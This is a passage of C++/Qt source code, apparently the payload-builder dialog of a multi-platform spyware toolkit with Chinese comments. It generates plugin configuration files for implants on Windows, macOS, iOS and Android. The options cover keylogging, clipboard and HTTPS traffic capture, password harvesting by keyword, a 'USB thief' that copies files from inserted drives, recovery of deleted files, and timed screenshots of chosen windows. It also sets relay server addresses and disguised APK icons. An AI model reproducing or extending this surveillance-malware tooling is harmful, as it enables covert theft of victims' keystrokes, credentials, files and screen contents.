	PUSER_ACT_CFG lpUserActCfgData = NULL;
	PUSB_THIEF_CONFIG lpUsbThiefCfgData = NULL;
	PCAPTURE_CONFIG lpCaptureCfgData = NULL;

	if ( !GetUserActionCfgInfo(lpUserActCfgData) )
	{
		return false;
	}

	if ( !GetUsbCfgInfo(lpUsbThiefCfgData) )
	{
		return false;
	}
	
	if ( !GetScreenshotCfgInfo(lpCaptureCfgData) )
	{
		return false;
	}

	for (; vectKey < MAX_PLG_COUNT; vectKey++)
	{
		PPLUGIN_CXT* PlgCxtVect = GetPlgCxtVect();
		pluginCxt = PlgCxtVect[vectKey];

		if (pluginCxt == NULL)
		{
			continue;
		}

		nPluginNameLen = strlen(pluginCxt->lpszPluginName) + 1;
		nProcListLen = strlen(pluginCxt->lpszProcList) + 1;
		nPluginDataLen = 0;
		lpPluginData = NULL;

		switch (pluginCxt->dwPluginId)
		{
		case 2:
			if (lpUserActCfgData)
			{
				nPluginDataLen = lpUserActCfgData->dwSize;
				lpPluginData = lpUserActCfgData;
			}
			break;

		case 3:
			if (lpUsbThiefCfgData)
			{
				nPluginDataLen = lpUsbThiefCfgData->dwSize;
				lpPluginData = lpUsbThiefCfgData;
			}
			break;

		case 4:
			if (lpCaptureCfgData)
			{
				nPluginDataLen = lpCaptureCfgData->dwSize;
				lpPluginData = lpCaptureCfgData;
			}
			break;

		default:
			break;
		}


		plgLen = 7 * sizeof(ULONG) + nPluginNameLen + nProcListLen + nPluginDataLen;
		memcpy(sOutline + pos, (void *)&plgLen, sizeof(ULONG));
		pos += sizeof(ULONG);

		// PID
		//
		memcpy(sOutline + pos, (void *)&pluginCxt->dwPluginId, sizeof(ULONG));
		pos += sizeof(ULONG);

		// Plugin Name (include null terminal)
		//
		memcpy(sOutline + pos, (void *)&nPluginNameLen, sizeof(ULONG));
		pos += sizeof(ULONG);

		memcpy(sOutline + pos, (void *)pluginCxt->lpszPluginName, nPluginNameLen);
		pos += nPluginNameLen;

		// 这里采取的策略，是不管插件是否第一次带过去，都可以先将策略生成
		//
		DWORD ver    = pluginCxt->dwPluginVer;
		DWORD uptVer = pluginCxt->dwUpdateVer;

		switch (pluginCxt->dwPluginId)
		{
		case 2:
			if ( !ui.chkPlg2->isChecked() )
			{
				ver = 0;    // 等于0，说明插件还没有上传
				uptVer = 0;
			}
			break;
		case 3:
			if ( !ui.chkPlg3->isChecked() )
			{
				ver = 0;    // 等于0，说明插件还没有上传
				uptVer = 0;
			}
			break;
		case 4:
			if ( !ui.chkPlg4->isChecked() )
			{
				ver = 0;    // 等于0，说明插件还没有上传
				uptVer = 0;
			}
			break;   
		default:
			break;
		}

		// VER and UPDATEVER
		//
		memcpy(sOutline + pos, (void *)&ver, sizeof(ULONG));
		pos += sizeof(ULONG);

		memcpy(sOutline + pos, (void *)&uptVer, sizeof(ULONG));
		pos += sizeof(ULONG);

		// TYPE
		//
		memcpy(sOutline + pos, (void *)&pluginCxt->dwLoadType, sizeof(ULONG));
		pos += sizeof(ULONG);

		// PROC list (include null terminal)
		//
		memcpy(sOutline + pos, (void *)&nProcListLen, sizeof(ULONG));
		pos += sizeof(ULONG);

		memcpy(sOutline + pos, (void *)pluginCxt->lpszProcList, nProcListLen);
		pos += nProcListLen;

		// DATALEN and Data
		//

		memcpy(sOutline + pos, (void *)&nPluginDataLen, sizeof(ULONG));
		pos += sizeof(ULONG);

		if (nPluginDataLen > 0)
		{
			memcpy(sOutline + pos, (void *)lpPluginData, nPluginDataLen);
			pos += nPluginDataLen;
		}
	}

	std::wstring cfgPath = GetExePath() + L"\\_Plugin\\" + this->m_curSystem + L"\\glp.uin";
	HANDLE hFile = CreateFile(cfgPath.c_str(),
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	DWORD dwByteWritten;
	bool bRet = WriteFile(hFile, sOutline, pos, &dwByteWritten, NULL);
	CloseHandle(hFile);

	if ( lpUserActCfgData )
	{
		AdkFree(lpUserActCfgData);
	}

	if ( lpUsbThiefCfgData )
	{
		AdkFree(lpUsbThiefCfgData);
	}

	if ( lpCaptureCfgData )
	{
		AdkFree(lpCaptureCfgData);
	}

	return bRet;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 生成 plugin.dat
//
bool GenerateDlg::GeneratePlgNameCfg()
{
	PPLUGIN_CXT pluginCxt;

	std::wstring cfgPath = GetExePath() + L"\\_Plugin\\" + m_curSystem +L"\\plugin.dat";

	HANDLE hFile = CreateFile(cfgPath.c_str(),
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	PPLUGIN_CXT* plgVect = GetPlgCxtVect();

	for (int i = 0; i < MAX_PLG_COUNT; i++)
	{
		pluginCxt = plgVect[i];

		if (pluginCxt == NULL)
		{
			continue;
		}

		PLUGIN_ALIAS plgAlias;
		std::string name = pluginCxt->lpszPluginName;
		std::wstring wName = AnsiToWide(name);

		plgAlias.dwPluginNumber = i;
		wcscpy(plgAlias.wzPluginName, wName.c_str());
		
		DWORD dump = 0;
		WriteFile(hFile, &plgAlias, sizeof(PLUGIN_ALIAS), &dump, NULL);
	}

	CloseHandle(hFile);

	return true;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 获取用户行为插件配置信息
//
bool GenerateDlg::GetUserActionCfgInfo(PUSER_ACT_CFG& lpUserActCfgData)
{
	if ( lpUserActCfgData )
	{
		AdkFree(lpUserActCfgData);
		lpUserActCfgData = NULL;
	}

	DWORD   dwFetch = 0;

	if ( ui.chkFileOp->isChecked() )
	{
		dwFetch |= USER_ACT_FILE_OP;
	}

	if ( ui.chkKeyboardOp->isChecked() )
	{
		dwFetch |= USER_ACT_KEYBOARD;
	}

	if ( ui.chkClipboardOp->isChecked() )
	{
		dwFetch |= USER_ACT_CLIPBOARD;
	}

	if ( ui.chkProcessOp->isChecked() )
	{
		dwFetch |= USER_ACT_PROC_TRACE;
	}

	if ( ui.chkExecuteOp->isChecked() )
	{
		dwFetch |= USER_ACT_PROC_FILE;
	}

	if ( ui.grpHttps->isChecked() )
	{
		if ( ui.chkHttpsSend->isChecked() )
		{
			dwFetch |= USER_ACT_HTTPS_SEND;
		}

		if ( ui.chkHttpsReceive->isChecked() )
		{
			dwFetch |= USER_ACT_HTTPS_RECV;
		}
	}

	std::wstring  wideKey;
	DWORD       dwKeyLen = 0;
	std::wstring  wideDelFilter;
	DWORD       dwDelFilterLen = 0;

	if ( ui.grpPassword->isChecked() )
	{
		if ( ui.chkEA_PASSWORD->isChecked() )
		{
			dwFetch |= USER_ACT_EA_PASSWD;
		}

		if ( ui.chkKeyword->isChecked() )
		{
			wideKey = ui.edtKeyword->text().toStdWString();
			if (wideKey.length() > 0)
			{
				dwKeyLen = wideKey.length() * sizeof(WCHAR) + 2;            
				dwFetch |= USER_ACT_PASSWD_KEYMATCH;
			}
			else
			{
				ui.chkKeyword->setChecked(false);
			}
		}
	}

	if ( ui.grpDeleteFile->isChecked() )
	{
		wideDelFilter = ui.edtDeleteFileExt->text().toStdWString();
		if (wideDelFilter.length() > 0)
		{
			dwDelFilterLen = wideDelFilter.length() * sizeof(WCHAR) + 2;
		}
		else
		{
			ui.grpDeleteFile->setChecked(false);
		}
	}

	DWORD dwSize = sizeof(USER_ACT_CFG) + dwKeyLen + dwDelFilterLen;

	PBYTE   lpbyData;
	lpUserActCfgData = (PUSER_ACT_CFG)AdkMalloc(dwSize);

	lpUserActCfgData->dwSize = dwSize;
	lpUserActCfgData->dwFetch = dwFetch;

	lpUserActCfgData->dwKeyListLength = dwKeyLen;

	if (dwKeyLen > 0)
	{
		lpUserActCfgData->dwKeyListOffset = sizeof(USER_ACT_CFG);
		lpbyData = (PBYTE)lpUserActCfgData + lpUserActCfgData->dwKeyListOffset;
		CopyMemory(lpbyData, wideKey.c_str(), dwKeyLen);
		lpUserActCfgData->lpwzKeyList = (PWCHAR)lpbyData;
	}

	lpUserActCfgData->dwMaxDelFile = 50 * 1024*1024;  // 50M @@TODO: 以后要开放给用户
	lpUserActCfgData->bGetDelFile = ui.grpDeleteFile->isChecked();

	if (lpUserActCfgData->bGetDelFile)
	{
		lpUserActCfgData->dwGetDelFileLength = dwDelFilterLen;
		if (dwDelFilterLen > 0)
		{
			lpUserActCfgData->dwGetDelFileOffset = sizeof(USER_ACT_CFG) + lpUserActCfgData->dwKeyListLength;
			lpbyData = (PBYTE)lpUserActCfgData + lpUserActCfgData->dwGetDelFileOffset;
			CopyMemory(lpbyData, wideDelFilter.c_str(), dwDelFilterLen);
			lpUserActCfgData->lpwzGetDelFileType = (PWCHAR)lpbyData;
		}
	}

	return true;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 获取 usb 配置信息
//
bool GenerateDlg::GetUsbCfgInfo(PUSB_THIEF_CONFIG& lpUsbThiefCfgData)
{
	if ( lpUsbThiefCfgData)
	{
		AdkFree(lpUsbThiefCfgData);
		lpUsbThiefCfgData = NULL;
	}

	DWORD       dwSize = sizeof(USB_THIEF_CONFIG);
	DWORD       dwMaxFileSize = 0;
	DWORD       dwExtFilterLen = 0;
	std::wstring  wideFilter;

	if ( ui.chkUsbFileRetrieve->isChecked() )
	{
		wideFilter = ui.edtUsbExt->text().toStdWString();

		if ( wideFilter.length() == 0 )
		{
			MessageBoxA((HWND)winId(), "USB文件扩展名过滤条件不能为空", "提示", MB_OK | MB_ICONINFORMATION);
			return false;
		}

		dwExtFilterLen = wideFilter.length() * 2 + 2;

		dwMaxFileSize = ui.spnUsbFileSize->value();
	}

	lpUsbThiefCfgData = (PUSB_THIEF_CONFIG)AdkMalloc(dwSize + dwExtFilterLen);
	lpUsbThiefCfgData->dwSize = dwSize + dwExtFilterLen;
	lpUsbThiefCfgData->bGetDir = ui.chkUsbDir->isChecked();
	lpUsbThiefCfgData->bGetFile = ui.chkUsbFileRetrieve->isChecked();
	lpUsbThiefCfgData->dwFilterSize = dwMaxFileSize * 1024 * 1024;
	lpUsbThiefCfgData->dwSizeOfType = dwExtFilterLen;

	if (dwExtFilterLen > 0)
	{
		wcscpy( lpUsbThiefCfgData->wzFilterType, wideFilter.c_str());
	}

	return true;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 获取截屏配置信息
//
bool GenerateDlg::GetScreenshotCfgInfo(PCAPTURE_CONFIG& lpCaptureCfgData)
{

	DWORD dwWindowsInternal = 0;

	if ( ui.chkSmartCapture->isChecked() )
	{
		if (( ui.edtProcName->text().length() == 0 )
			&& ( ui.edtWindowTitle->text().length() == 0 ))
		{
			MessageBoxA((HWND)winId(), "\"智能截取目标窗口\"必须至少提供一个过滤条件", "提示", MB_OK | MB_ICONINFORMATION);
			return false;        
		}

		dwWindowsInternal = ui.spnInterval->value();

		if ( dwWindowsInternal < 15)
		{
			MessageBoxA((HWND)winId(), "\"窗口截取间隔\"必须大于15秒", "提示", MB_OK | MB_ICONINFORMATION);
			return false;
		}
	}

	DWORD      dwKeyListLen = 0;
	DWORD      dwProcListLen = 0;
	std::wstring wideKeyList;
	std::wstring wideProcList;
	
	if ( ui.chkSmartCapture->isChecked() )
	{
		wideKeyList = ui.edtWindowTitle->text().toStdWString();
		if (wideKeyList.length() > 0)
		{
			dwKeyListLen = wideKeyList.length()* sizeof(WCHAR) + 2;
		}

		wideProcList = ui.edtProcName->text().toStdWString();
		if (wideProcList.length() > 0)
		{
			dwProcListLen = wideProcList.length()* sizeof(WCHAR) + 2;
		}
	}

	DWORD dwSize = sizeof(CAPTURE_CONFIG) + dwKeyListLen + dwProcListLen;

	lpCaptureCfgData = (PCAPTURE_CONFIG)AdkMalloc(dwSize);

	lpCaptureCfgData->dwSize = dwSize;
	lpCaptureCfgData->bCapWindow = ui.chkSmartCapture->isChecked();

	if ( lpCaptureCfgData->bCapWindow )
	{
		lpCaptureCfgData->dwWindowInterval = dwWindowsInternal;      // 默认20秒
		lpCaptureCfgData->dwKeyListLength = dwKeyListLen;
		lpCaptureCfgData->dwProcessListLength = dwProcListLen;

		PBYTE lpbyData = NULL;

		if (dwKeyListLen > 0)
		{
			lpCaptureCfgData->dwKeyListOffset = sizeof(CAPTURE_CONFIG);
			lpbyData = (PBYTE)lpCaptureCfgData + sizeof(CAPTURE_CONFIG);
			CopyMemory(lpbyData, wideKeyList.c_str(), dwKeyListLen);
		}

		if (dwProcListLen > 0)
		{
			lpCaptureCfgData->dwProcessListOffset = sizeof(CAPTURE_CONFIG) + lpCaptureCfgData->dwKeyListLength;
			lpbyData = (PBYTE)lpCaptureCfgData + lpCaptureCfgData->dwProcessListOffset;
			CopyMemory(lpbyData, wideProcList.c_str(), dwProcListLen);
		}
	}

	return true;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 获取指定系统的 PlgCxtVect
//
PPLUGIN_CXT* GenerateDlg::GetPlgCxtVect()
{
	PPLUGIN_CXT* PlgCxtVect = NULL;
	if ( m_curSystem == L"WINDOWS" )
	{
		PlgCxtVect = FrmMain->WindowsPlgCxtVect;
	}
	else if ( m_curSystem == L"MACOSX" )
	{
		PlgCxtVect = FrmMain->MacPlgCxtVect;
	}
	else if ( m_curSystem == L"IOS" )
	{
		PlgCxtVect = FrmMain->IosPlgCxtVect;
	}
	else if ( m_curSystem == L"Android")
	{
		PlgCxtVect = FrmMain->AndroidPlgCxtVect;
	}

	return PlgCxtVect;
}

void GenerateDlg::InitCustomGui()
{
	QListWidgetItem* windows = ui.lstPlatform->takeItem(0);
	QListWidgetItem* mac = ui.lstPlatform->takeItem(0);
	QListWidgetItem* ios = ui.lstPlatform->takeItem(0);
	QListWidgetItem* android = ui.lstPlatform->takeItem(0);

	if ( Exist(GetExePath() + L"\\_Plugin\\WINDOWS") )
		ui.lstPlatform->addItem(windows);

	if ( Exist(GetExePath() + L"\\_Plugin\\MACOSX") )
		ui.lstPlatform->addItem(mac);

	if ( Exist(GetExePath() + L"\\_Plugin\\IOS") )
		ui.lstPlatform->addItem(ios);

	if ( Exist(GetExePath() + L"\\_Plugin\\ANDROID") )
		ui.lstPlatform->addItem(android);

	PlatformChanged(ui.lstPlatform->item(0));
	ui.lstPlatform->item(0)->setSelected(true);
}

void GenerateDlg::GenerateFinished()
{
	if ( NULL != m_genThread )
	{
		delete m_genThread;
		m_genThread = NULL;
		m_waitDlg->close();
	}
}

GenerateThread* GenerateDlg::CreateGenerateThread(std::wstring path)
{
	if ( m_curSystem == L"MACOSX")
		return new GenerateMacThread(path, GetPluginEnabledLayout());
	else if ( m_curSystem == L"IOS" )
		return new GenerateIOSThread(path, GetPluginEnabledLayout());
	else if ( m_curSystem == L"Android" )
		return new GenerateAndroidThread(path, GetPluginEnabledLayout(),
		ui.chkRooted->isChecked(), PacketApkScript[ui.cmbApkIcon->currentIndex()]);

	MessageBoxW(NULL, L"不支持的系统类型!", L"提示", MB_OK | MB_ICONERROR);
	return NULL;
}

void GenerateDlg::ServerTypeChanged_1( int index )
{
	ui.edtIp->clear();
	ui.edtIp->setValidator( index ? NULL : m_ipMask);
	ui.btnGetIP->setEnabled( index ? true : false);
}

void GenerateDlg::ServerTypeChanged_2( int index )
{
	ui.edAlternateIp->clear();
	ui.edAlternateIp->setValidator( index ? NULL : m_ipMask);
	ui.btnGetIP2->setEnabled( index ? true : false);
}

void GenerateDlg::GetIP()
{
	QLineEdit* edtIP = sender()->objectName() == "btnGetIP" ? ui.edtIp : ui.edAlternateIp;

	DWORD addr = inet_addr(edtIP->text().toStdString().c_str());

	if (INADDR_NONE != addr)
	{
		MessageBoxA(NULL, "主中转服务器输入地址不是域名格式!", "提示", MB_OK | MB_ICONINFORMATION);
		return;
	}

	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof(hints));
	hints.ai_flags    = AI_CANONNAME;
	hints.ai_family   = AF_INET;      // only support IPv4
	hints.ai_socktype = SOCK_STREAM;  // only support TCP
	hints.ai_protocol = IPPROTO_TCP;  // TCP protocol

	int iRes = getaddrinfo(edtIP->text().toStdString().c_str(), NULL, &hints, &res);

	if ( iRes == 0 )
	{
		struct sockaddr_in *inaddr = (struct sockaddr_in *)(res->ai_addr);
		char text[512] = {0};
		sprintf(text, "域名:%s\nIP地址:%s", edtIP->text().toStdString().c_str(), inet_ntoa(inaddr->sin_addr));
		MessageBoxA(NULL, text, "提示", MB_OK | MB_ICONINFORMATION);
	}
	else
	{
		MessageBoxA(NULL, "域名解析失败,无法获知其对应IP地址", "提示", MB_OK | MB_ICONINFORMATION);
	}
}

void GenerateDlg::RootStatusChanged()
{
	if ( ui.chkRooted->isChecked() )
	{
		ui.chkPlg2->show();
		ui.chkPlg4->show();
	}
	else
	{
		ui.chkPlg2->hide();
		ui.chkPlg4->hide();
	}
}

void GenerateDlg::UpdatePluginEnabled()
{
	ZeroMemory(m_plgEnabled, sizeof(bool)*MAX_PLG_COUNT);

	m_plgEnabled[1] = true;
	m_plgEnabled[2] = ui.chkPlg2->isChecked();
	m_plgEnabled[3] = ui.chkPlg3->isChecked();
	m_plgEnabled[4] = ui.chkPlg4->isChecked();
}

void GenerateDlg::EnvironmentChanged()
{
	if ( ui.chkLocal->isChecked() )
		ui.cmbApkIcon->setEnabled(true);
	else
		ui.cmbApkIcon->setEnabled(false);
}